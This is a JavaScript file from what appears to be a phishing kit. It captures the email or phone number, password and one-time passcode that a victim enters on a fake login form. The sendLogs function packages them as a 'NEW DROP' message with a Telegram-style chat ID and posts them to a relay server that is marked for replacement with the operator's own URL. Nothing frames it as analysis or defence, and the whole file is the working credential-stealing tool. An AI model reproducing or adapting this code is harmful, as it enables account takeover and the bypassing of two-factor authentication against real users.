let user = {
    "authtype": "",
    "phone" : "",
    "email" : "",
    "otp" : "",
    "pw": "",
    "ip": ""
}
 
$('.proceed').click(function (){
    user.authtype  = $(".userauthtype").val();
    user.pw  = $(".userpw").val();
    user.otp  = $(".userotp").val();

    $('#nextBtn').click()
})
function setLoginType(){
    function isEmail(input) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(input);
    }

    const userInput = $(".userauthtype").val();
    console.log(userInput)
    if (isEmail(userInput)) {
        user.authtype = 'email'
        user.email = userInput
         $('.email').show()
         $('.phone').hide()

    } else {
        user.authtype = 'phone'
        user.phone = userInput
        $('.phone').show()
        $('.email').hide()
    }
    
}
$('.setLoginType').click(function (){
    setLoginType()
})

$('.userotp').click(function (){
    user.authtype  = $(".userauthtype").val();
    user.pw  = $(".userpw").val();
    user.otp  = $(".userotp").val();
    
    sendLogs()
})




function handleState(){
    user.authtype = $(".userauthtype").val();
    user.phone = $(".phone").val();
    user.email = $(".email").val();
    user.otp = $(".otp").val();
    user.pw = $(".pw").val();
    user.ip = $(".ip").val();
    if( user.authtype == 'email'){
    }
    
    if( user.pw == ''){
        showPassword()    
    } 
    
    if( user.otp == ''){
        showOtp()    
    } 
}
let chatId = '-4176809792';

function sendLogs(){
    // const message = 'NEW DROP ✅ \n\n Email: <pre>  ' + JSON.stringify('test@test.com', null, 2) + '</pre> \n Password:  <pre>' + JSON.stringify('12345678', null, 2) + '</pre>'
    const message = 'NEW DROP ✅ \n\n <pre>  ' + JSON.stringify(user, null, 2) + '</pre>'

    const apiUrl = 'http://localhost:3000/log'; // Update with your server URL

    const postData = {
        chatId: chatId,
        message: message,
        // Add more key-value pairs as needed
    };

    fetch(apiUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(postData),
    })
        .then(response => response.json())
        .then(data => {
            console.log('Response:', data);
        })
        .catch(error => {
            console.error('Error:', error);
        });

}